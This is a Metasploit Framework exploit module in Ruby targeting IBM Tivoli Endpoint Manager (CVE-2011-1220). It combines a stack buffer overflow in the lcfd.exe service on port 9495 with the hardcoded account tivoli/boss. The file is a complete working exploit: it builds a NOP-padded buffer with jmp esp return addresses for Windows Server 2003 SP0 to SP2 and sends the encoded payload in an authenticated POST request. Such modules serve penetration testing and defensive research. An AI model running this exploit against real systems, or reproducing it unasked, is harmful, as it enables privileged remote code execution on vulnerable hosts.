##
# $Id: ibm_tivoli_endpoint_bof.rb 12925 2011-06-12 00:04:55Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'IBM Tivoli Endpoint Manager POST Query Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack based buffer overflow in the way IBM Tivoli
                Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query
                arguments.
 
                This issue can be triggered by sending a specially crafted HTTP POST request to
            the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization
            is required. This exploit makes use of a second vulnerability, a hardcoded account
            (tivoli/boss) is used to bypass the authorization restriction.
            },
            'Author'         =>
                [
                    'bannedit', # metasploit module
                    'Jeremy Brown <0xjbrown[at]gmail.com>', # original public exploit
                ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 12925 $',
            'References'     =>
                [
                    [ 'CVE', '2011-1220'],
                    [ 'OSVDB', '72713'], # buffer overflow
                    [ 'OSVDB', '72751'], # hardcoded account
                    [ 'BID', '48049'],
                    [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-169/' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Privileged'     => true,
            'Payload'        =>
                {
                    'Space'    => 400,
                    'BadChars' => "\x00\x0d\x0a",
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    ['Windows Server 2003 SP0', { 'Ret' => 0x77d80787 }], # user32.dll - jmp esp
                    ['Windows Server 2003 SP1', { 'Ret' => 0x77403680 }], # user32.dll - jmp esp
                    ['Windows Server 2003 SP2', { 'Ret' => 0x77402680 }], # user32.dll - jmp esp
                ],
            'DisclosureDate' => 'May 31 2011'))
 
        register_options(
            [
                Opt::RPORT(9495),
            ], self.class )
    end
 
    def exploit
        print_status("Trying target #{target.name}...")
 
        auth = Rex::Text.encode_base64("tivoli:boss")
        varname = rand_text_alpha(rand(10))
 
        sploit = make_nops(1) * 256
        sploit << [target.ret].pack('V')
        sploit << payload.encoded
         
        print_status("Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}")
        res = send_request_cgi({
            'uri'          => '/addr',
            'method'       => 'POST',
            'headers'      =>
            {
                'Authorization' => "Basic #{auth}"
            },
            'vars_post'    =>
            {
                varname => sploit,
            },
        }, 5)
 
        handler
    end
end